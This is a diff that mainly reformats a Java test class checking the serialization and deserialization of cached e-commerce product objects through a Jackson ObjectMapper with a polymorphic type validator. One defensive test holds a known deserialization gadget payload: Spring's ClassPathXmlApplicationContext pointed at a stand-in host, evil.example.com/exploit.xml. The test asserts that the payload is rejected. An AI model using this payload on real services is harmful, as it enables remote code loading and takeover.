@@ -18,11 +18,7 @@ import com.personal.marketnote.product.adapter.out.persistence.productcatalog.ma
 import com.personal.marketnote.product.domain.pricepolicy.PricePolicy;
 import com.personal.marketnote.product.domain.pricepolicy.PricePolicySnapshotState;
 import com.personal.marketnote.product.domain.pricepolicy.Rate;
-import com.personal.marketnote.product.domain.product.FasstoProductCodeGenerator;
-import com.personal.marketnote.product.domain.product.Product;
-import com.personal.marketnote.product.domain.product.ProductSnapshotState;
-import com.personal.marketnote.product.domain.product.ProductTag;
-import com.personal.marketnote.product.domain.product.ProductTagSnapshotState;
+import com.personal.marketnote.product.domain.product.*;
 import com.personal.marketnote.product.port.in.result.product.ProductCatalogItemResult;
 import com.personal.marketnote.product.port.in.result.product.ProductCatalogOptionSnapshot;
 import com.personal.marketnote.product.port.in.result.product.ProductCatalogTagSnapshot;
@@ -37,9 +33,7 @@ import java.util.UUID;
 import java.util.stream.Collectors;
 import java.util.stream.Stream;
 
-import static org.assertj.core.api.Assertions.assertThat;
-import static org.assertj.core.api.Assertions.assertThatCode;
-import static org.assertj.core.api.Assertions.assertThatThrownBy;
+import static org.assertj.core.api.Assertions.*;
 
 /**
  * CacheConfig ObjectMapper 직렬화/역직렬화 왕복 테스트
@@ -58,9 +52,9 @@ class CacheConfigObjectMapperTest {
     private ObjectMapper createCacheObjectMapper() {
         ObjectMapper mapper = new ObjectMapperConfig().objectMapper();
         mapper.activateDefaultTyping(
-                CachePolymorphicTypeValidatorFactory.createDefault(),
-                ObjectMapper.DefaultTyping.NON_FINAL,
-                JsonTypeInfo.As.PROPERTY
+            CachePolymorphicTypeValidatorFactory.createDefault(),
+            ObjectMapper.DefaultTyping.NON_FINAL,
+            JsonTypeInfo.As.PROPERTY
         );
         mapper.setVisibility(PropertyAccessor.GETTER, JsonAutoDetect.Visibility.NONE);
         mapper.setVisibility(PropertyAccessor.IS_GETTER, JsonAutoDetect.Visibility.NONE);
@@ -75,52 +69,52 @@ class CacheConfigObjectMapperTest {
 
     private PricePolicy createTestPricePolicy() {
         return PricePolicy.from(
-                PricePolicySnapshotState.builder()
-                        .id(1L)
-                        .price(10000L)
-                        .discountPrice(8000L)
-                        .discountRate(Rate.of(BigDecimal.valueOf(20.0)))
-                        .accumulatedPoint(100L)
-                        .accumulationRate(Rate.of(BigDecimal.valueOf(1.3)))
-                        .popularity(5L)
-                        .status(EntityStatus.ACTIVE)
-                        .orderNum(1L)
-                        .optionIds(List.of(1L, 2L))
-                        .build()
+            PricePolicySnapshotState.builder()
+                .id(1L)
+                .price(10000L)
+                .discountPrice(8000L)
+                .discountRate(Rate.of(BigDecimal.valueOf(20.0)))
+                .accumulatedPoint(100L)
+                .accumulationRate(Rate.of(BigDecimal.valueOf(1.3)))
+                .popularity(5L)
+                .status(EntityStatus.ACTIVE)
+                .orderNum(1L)
+                .optionIds(List.of(1L, 2L))
+                .build()
         );
     }
 
     private Product createTestProduct() {
         ProductTag tag = ProductTag.from(
-                ProductTagSnapshotState.builder()
-                        .id(1L)
-                        .productId(1L)
-                        .name("테스트태그")
-                        .orderNum(1L)
-                        .status(EntityStatus.ACTIVE)
-                        .build()
+            ProductTagSnapshotState.builder()
+                .id(1L)
+                .productId(1L)
+                .name("테스트태그")
+                .orderNum(1L)
+                .status(EntityStatus.ACTIVE)
+                .build()
         );
 
         PricePolicy pricePolicy = createTestPricePolicy();
 
         return Product.from(
-                ProductSnapshotState.builder()
-                        .id(1L)
-                        .productKey(TEST_PRODUCT_KEY)
-                        .sellerId(2L)
-                        .name("테스트 상품")
-                        .brandName("테스트 브랜드")
-                        .detail("상세 설명")
-                        .defaultPricePolicy(pricePolicy)
-                        .sales(10)
-                        .viewCount(100L)
-                        .popularity(50L)
-                        .findAllOptionsYn(true)
-                        .productTags(List.of(tag))
-                        .orderNum(1L)
-                        .status(EntityStatus.ACTIVE)
-                        .fasstoProductCode(FasstoProductCodeGenerator.encode(TEST_PRODUCT_KEY))
-                        .build()
+            ProductSnapshotState.builder()
+                .id(1L)
+                .productKey(TEST_PRODUCT_KEY)
+                .sellerId(2L)
+                .name("테스트 상품")
+                .brandName("테스트 브랜드")
+                .detail("상세 설명")
+                .defaultPricePolicy(pricePolicy)
+                .sales(10)
+                .viewCount(100L)
+                .popularity(50L)
+                .findAllOptionsYn(true)
+                .productTags(List.of(tag))
+                .orderNum(1L)
+                .status(EntityStatus.ACTIVE)
+                .fasstoProductCode(FasstoProductCodeGenerator.encode(TEST_PRODUCT_KEY))
+                .build()
         );
     }
 
@@ -136,8 +130,8 @@ class CacheConfigObjectMapperTest {
 
         // then - ImmutableList는 타입 래퍼가 누락되어 역직렬화 실패
         assertThatCode(() -> mapper.readValue(json, Object.class))
-                .isInstanceOf(Exception.class)
-                .hasMessageContaining("Unexpected token (START_OBJECT), expected VALUE_STRING");
+            .isInstanceOf(Exception.class)
+            .hasMessageContaining("Unexpected token (START_OBJECT), expected VALUE_STRING");
     }
 
     @Test
@@ -146,7 +140,7 @@ class CacheConfigObjectMapperTest {
         // given
         ObjectMapper mapper = createCacheObjectMapper();
         List<PricePolicy> pricePolicies = Stream.of(createTestPricePolicy())
-                .collect(Collectors.toCollection(ArrayList::new));
+            .collect(Collectors.toCollection(ArrayList::new));
 
         // when
         String json = mapper.writeValueAsString(pricePolicies);
@@ -188,7 +182,7 @@ class CacheConfigObjectMapperTest {
         // given
         ObjectMapper mapper = createCacheObjectMapper();
         List<Product> products = Stream.of(createTestProduct())
-                .collect(Collectors.toCollection(ArrayList::new));
+            .collect(Collectors.toCollection(ArrayList::new));
 
         // when
         String json = mapper.writeValueAsString(products);
@@ -203,28 +197,28 @@ class CacheConfigObjectMapperTest {
 
     private ProductCatalogItemResult createTestCatalogItemResult() {
         return new ProductCatalogItemResult(
-                1L,
-                10L,
-                20L,
-                30L,
-                "테스트 상품",
-                "테스트 브랜드",
-                10000L,
-                8000L,
-                BigDecimal.valueOf(20.0),
-                100L,
-                BigDecimal.valueOf(1.3),
-                1L,
-                5L,
-                "https://example.com/image.jpg",
-                new ArrayList<>(List.of("https://example.com/r1.jpg", "https://example.com/r2.jpg")),
-                50,
-                10,
-                BigDecimal.valueOf(4.5),
-                100L,
-                new ArrayList<>(List.of(new ProductCatalogTagSnapshot(1L, "태그1", 1L))),
-                new ArrayList<>(List.of(new ProductCatalogOptionSnapshot(1L, "옵션내용"))),
-                "ACTIVE"
+            1L,
+            10L,
+            20L,
+            30L,
+            "테스트 상품",
+            "테스트 브랜드",
+            10000L,
+            8000L,
+            BigDecimal.valueOf(20.0),
+            100L,
+            BigDecimal.valueOf(1.3),
+            1L,
+            5L,
+            "https://example.com/image.jpg",
+            new ArrayList<>(List.of("https://example.com/r1.jpg", "https://example.com/r2.jpg")),
+            50,
+            10,
+            BigDecimal.valueOf(4.5),
+            100L,
+            new ArrayList<>(List.of(new ProductCatalogTagSnapshot(1L, "태그1", 1L))),
+            new ArrayList<>(List.of(new ProductCatalogOptionSnapshot(1L, "옵션내용"))),
+            "ACTIVE"
         );
     }
 
@@ -292,7 +286,7 @@ class CacheConfigObjectMapperTest {
 
         // when & then
         assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
-                .isInstanceOf(InvalidTypeIdException.class);
+            .isInstanceOf(InvalidTypeIdException.class);
     }
 
     @Test
@@ -304,7 +298,7 @@ class CacheConfigObjectMapperTest {
 
         // when & then
         assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
-                .isInstanceOf(InvalidTypeIdException.class);
+            .isInstanceOf(InvalidTypeIdException.class);
     }
 
     @Test
@@ -313,11 +307,11 @@ class CacheConfigObjectMapperTest {
         // given
         ObjectMapper mapper = createCacheObjectMapper();
         String maliciousJson =
-                "[\"org.springframework.context.support.ClassPathXmlApplicationContext\",\"http://evil.example.com/exploit.xml\"]";
+            "[\"org.springframework.context.support.ClassPathXmlApplicationContext\",\"http://evil.example.com/exploit.xml\"]";
 
         // when & then
         assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
-                .isInstanceOf(InvalidTypeIdException.class);
+            .isInstanceOf(InvalidTypeIdException.class);
     }
 
     @Test
@@ -326,12 +320,12 @@ class CacheConfigObjectMapperTest {
         // given
         ObjectMapper mapper = createCacheObjectMapper();
         ProductCatalogItemResult original = new ProductCatalogItemResult(
-                1L, 10L, 20L, 30L, "테스트 상품", "테스트 브랜드", 10000L, 8000L,
-                BigDecimal.valueOf(20.0), 100L, BigDecimal.valueOf(1.3), 1L, 5L,
-                "https://example.com/image.jpg",
-                List.of(),
-                50, 10, BigDecimal.valueOf(4.5), 100L,
-                new ArrayList<>(), new ArrayList<>(), "ACTIVE"
+            1L, 10L, 20L, 30L, "테스트 상품", "테스트 브랜드", 10000L, 8000L,
+            BigDecimal.valueOf(20.0), 100L, BigDecimal.valueOf(1.3), 1L, 5L,
+            "https://example.com/image.jpg",
+            List.of(),
+            50, 10, BigDecimal.valueOf(4.5), 100L,
+            new ArrayList<>(), new ArrayList<>(), "ACTIVE"
         );
 
         // when
@@ -350,13 +344,13 @@ class CacheConfigObjectMapperTest {
         // given
         ObjectMapper mapper = createCacheObjectMapper();
         ProductCatalogItemResult original = new ProductCatalogItemResult(
-                1L, 10L, 20L, 30L, "테스트 상품", "테스트 브랜드", 10000L, 8000L,
-                BigDecimal.valueOf(20.0), 100L, BigDecimal.valueOf(1.3), 1L, 5L,
-                "https://example.com/image.jpg",
-                new ArrayList<>(),
-                50, 10, BigDecimal.valueOf(4.5), 100L,
-                Collections.emptyList(),
-                new ArrayList<>(), "ACTIVE"
+            1L, 10L, 20L, 30L, "테스트 상품", "테스트 브랜드", 10000L, 8000L,
+            BigDecimal.valueOf(20.0), 100L, BigDecimal.valueOf(1.3), 1L, 5L,
+            "https://example.com/image.jpg",
+            new ArrayList<>(),
+            50, 10, BigDecimal.valueOf(4.5), 100L,
+            Collections.emptyList(),
+            new ArrayList<>(), "ACTIVE"
         );
 
         // when
@@ -375,17 +369,17 @@ class CacheConfigObjectMapperTest {
         // given
         ObjectMapper mapper = createCacheObjectMapper();
         List<ProductCatalogOptionSnapshot> immutableOptions = Stream.of(
-                new ProductCatalogOptionSnapshot(1L, "옵션내용")
+            new ProductCatalogOptionSnapshot(1L, "옵션내용")
         ).toList();
         ProductCatalogItemResult original = new ProductCatalogItemResult(
-                1L, 10L, 20L, 30L, "테스트 상품", "테스트 브랜드", 10000L, 8000L,
-                BigDecimal.valueOf(20.0), 100L, BigDecimal.valueOf(1.3), 1L, 5L,
-                "https://example.com/image.jpg",
-                new ArrayList<>(),
-                50, 10, BigDecimal.valueOf(4.5), 100L,
-                new ArrayList<>(),
-                immutableOptions,
-                "ACTIVE"
+            1L, 10L, 20L, 30L, "테스트 상품", "테스트 브랜드", 10000L, 8000L,
+            BigDecimal.valueOf(20.0), 100L, BigDecimal.valueOf(1.3), 1L, 5L,
+            "https://example.com/image.jpg",
+            new ArrayList<>(),
+            50, 10, BigDecimal.valueOf(4.5), 100L,
+            new ArrayList<>(),
+            immutableOptions,
+            "ACTIVE"
         );
 
         // when
@@ -405,10 +399,10 @@ class CacheConfigObjectMapperTest {
         // given
         ObjectMapper mapper = createCacheObjectMapper();
         ProductCatalogReadModelJpaEntity entity = ProductCatalogReadModelJpaEntity.of(
-                1L, 10L, 20L, 30L, "테스트 상품", "테스트 브랜드",
-                10000L, 8000L, BigDecimal.valueOf(20.0),
-                100L, BigDecimal.valueOf(1.3), 1L, 5L, 100L,
-                null, null
+            1L, 10L, 20L, 30L, "테스트 상품", "테스트 브랜드",
+            10000L, 8000L, BigDecimal.valueOf(20.0),
+            100L, BigDecimal.valueOf(1.3), 1L, 5L, 100L,
+            null, null
         );
         ProductCatalogItemResult mapped = ProductCatalogReadModelJpaEntityToResultMapper.mapToResult(entity, mapper);
 
@@ -442,11 +436,11 @@ class CacheConfigObjectMapperTest {
         System.out.println(mapper.writeValueAsString(Collections.emptyList()));
 
         ProductCatalogItemResult original = new ProductCatalogItemResult(
-                1L, 10L, 20L, 30L, "테스트 상품", "테스트 브랜드", 10000L, 8000L,
-                BigDecimal.valueOf(20.0), 100L, BigDecimal.valueOf(1.3), 1L, 5L,
-                "https://example.com/image.jpg",
-                List.of(), 50, 10, BigDecimal.valueOf(4.5), 100L,
-                List.of(), List.of(), "ACTIVE"
+            1L, 10L, 20L, 30L, "테스트 상품", "테스트 브랜드", 10000L, 8000L,
+            BigDecimal.valueOf(20.0), 100L, BigDecimal.valueOf(1.3), 1L, 5L,
+            "https://example.com/image.jpg",
+            List.of(), 50, 10, BigDecimal.valueOf(4.5), 100L,
+            List.of(), List.of(), "ACTIVE"
         );
         System.out.println("=== ProductCatalogItemResult with List.of() in fields ===");
         System.out.println(mapper.writeValueAsString(original));
@@ -462,23 +456,23 @@ class CacheConfigObjectMapperTest {
         // Adapter 에서 ArrayList 명시 변환으로 직렬화 자체에 wrapper 가 부여되도록 차단함.
         ObjectMapper mapper = createCacheObjectMapper();
         String qaPatternJson = "[{\"@class\":\"com.personal.marketnote.product.port.in.result.product.ProductCatalogItemResult\","
-                + "\"pricePolicyId\":1,\"productId\":10,\"sellerId\":20,\"primaryCategoryId\":30,"
-                + "\"name\":\"테스트\",\"brandName\":\"브랜드\",\"price\":10000,\"discountPrice\":8000,"
-                + "\"discountRate\":[\"java.math.BigDecimal\",20.0],"
-                + "\"accumulatedPoint\":100,"
-                + "\"accumulatedPointRate\":[\"java.math.BigDecimal\",1.3],"
-                + "\"orderNum\":1,\"popularity\":5,\"representativeImageUrl\":null,"
-                + "\"resizedImageUrls\":[\"java.util.ImmutableCollections$ListN\",[]],"
-                + "\"stockQuantity\":0,\"reviewCount\":0,"
-                + "\"reviewAverageRating\":[\"java.math.BigDecimal\",0.0],"
-                + "\"sales\":0,"
-                + "\"productTags\":[\"java.util.ArrayList\",[]],"
-                + "\"selectedOptions\":[\"java.util.ArrayList\",[]],"
-                + "\"status\":\"ACTIVE\"}]";
+            + "\"pricePolicyId\":1,\"productId\":10,\"sellerId\":20,\"primaryCategoryId\":30,"
+            + "\"name\":\"테스트\",\"brandName\":\"브랜드\",\"price\":10000,\"discountPrice\":8000,"
+            + "\"discountRate\":[\"java.math.BigDecimal\",20.0],"
+            + "\"accumulatedPoint\":100,"
+            + "\"accumulatedPointRate\":[\"java.math.BigDecimal\",1.3],"
+            + "\"orderNum\":1,\"popularity\":5,\"representativeImageUrl\":null,"
+            + "\"resizedImageUrls\":[\"java.util.ImmutableCollections$ListN\",[]],"
+            + "\"stockQuantity\":0,\"reviewCount\":0,"
+            + "\"reviewAverageRating\":[\"java.math.BigDecimal\",0.0],"
+            + "\"sales\":0,"
+            + "\"productTags\":[\"java.util.ArrayList\",[]],"
+            + "\"selectedOptions\":[\"java.util.ArrayList\",[]],"
+            + "\"status\":\"ACTIVE\"}]";
 
         // when & then
         assertThatThrownBy(() -> mapper.readValue(qaPatternJson, Object.class))
-                .isInstanceOf(com.fasterxml.jackson.databind.exc.MismatchedInputException.class);
+            .isInstanceOf(com.fasterxml.jackson.databind.exc.MismatchedInputException.class);
     }
 
     @Test
@@ -488,12 +482,12 @@ class CacheConfigObjectMapperTest {
         // ArrayList 는 non-final → NON_FINAL 정책에서 type info 부여 → 직렬화 결과 ["java.util.ArrayList", [...]] wrapper 보존.
         ObjectMapper mapper = createCacheObjectMapper();
         ProductCatalogItemResult item = new ProductCatalogItemResult(
-                1L, 10L, 20L, 30L, "테스트 상품", "테스트 브랜드", 10000L, 8000L,
-                BigDecimal.valueOf(20.0), 100L, BigDecimal.valueOf(1.3), 1L, 5L,
-                "https://example.com/image.jpg",
-                new ArrayList<>(List.of("a")),
-                50, 10, BigDecimal.valueOf(4.5), 100L,
-                new ArrayList<>(), new ArrayList<>(), "ACTIVE"
+            1L, 10L, 20L, 30L, "테스트 상품", "테스트 브랜드", 10000L, 8000L,
+            BigDecimal.valueOf(20.0), 100L, BigDecimal.valueOf(1.3), 1L, 5L,
+            "https://example.com/image.jpg",
+            new ArrayList<>(List.of("a")),
+            50, 10, BigDecimal.valueOf(4.5), 100L,
+            new ArrayList<>(), new ArrayList<>(), "ACTIVE"
         );
         List<ProductCatalogItemResult> arrayListWrapped = new ArrayList<>(List.of(item));
 
@@ -514,14 +508,14 @@ class CacheConfigObjectMapperTest {
         // given
         ObjectMapper mapper = createCacheObjectMapper();
         ProductCatalogItemResult original = new ProductCatalogItemResult(
-                1L, 10L, 20L, 30L, "테스트 상품", "테스트 브랜드", 10000L, 8000L,
-                BigDecimal.valueOf(20.0), 100L, BigDecimal.valueOf(1.3), 1L, 5L,
-                "https://example.com/image.jpg",
-                List.of("https://example.com/r1.jpg", "https://example.com/r2.jpg"),
-                50, 10, BigDecimal.valueOf(4.5), 100L,
-                List.of(new ProductCatalogTagSnapshot(1L, "태그1", 1L)),
-                List.of(new ProductCatalogOptionSnapshot(1L, "옵션내용")),
-                "ACTIVE"
+            1L, 10L, 20L, 30L, "테스트 상품", "테스트 브랜드", 10000L, 8000L,
+            BigDecimal.valueOf(20.0), 100L, BigDecimal.valueOf(1.3), 1L, 5L,
+            "https://example.com/image.jpg",
+            List.of("https://example.com/r1.jpg", "https://example.com/r2.jpg"),
+            50, 10, BigDecimal.valueOf(4.5), 100L,
+            List.of(new ProductCatalogTagSnapshot(1L, "태그1", 1L)),
+            List.of(new ProductCatalogOptionSnapshot(1L, "옵션내용")),
+            "ACTIVE"
         );
 
         // when
@@ -532,7 +526,7 @@ class CacheConfigObjectMapperTest {
         assertThat(deserialized).isInstanceOf(ProductCatalogItemResult.class);
         ProductCatalogItemResult result = (ProductCatalogItemResult) deserialized;
         assertThat(result.resizedImageUrls())
-                .containsExactly("https://example.com/r1.jpg", "https://example.com/r2.jpg");
+            .containsExactly("https://example.com/r1.jpg", "https://example.com/r2.jpg");
         assertThat(result.productTags()).hasSize(1);
         assertThat(result.productTags().get(0).name()).isEqualTo("태그1");
         assertThat(result.selectedOptions()).hasSize(1);
@@ -556,7 +550,7 @@ class CacheConfigObjectMapperTest {
         assertThat(result.discountRate()).isEqualByComparingTo(BigDecimal.valueOf(20.0));
         assertThat(result.reviewAverageRating()).isEqualByComparingTo(BigDecimal.valueOf(4.5));
         assertThat(result.resizedImageUrls())
-                .containsExactly("https://example.com/r1.jpg", "https://example.com/r2.jpg");
+            .containsExactly("https://example.com/r1.jpg", "https://example.com/r2.jpg");
         assertThat(result.productTags()).hasSize(1);
         assertThat(result.productTags().get(0)).isInstanceOf(ProductCatalogTagSnapshot.class);
         assertThat(result.productTags().get(0).name()).isEqualTo("태그1");
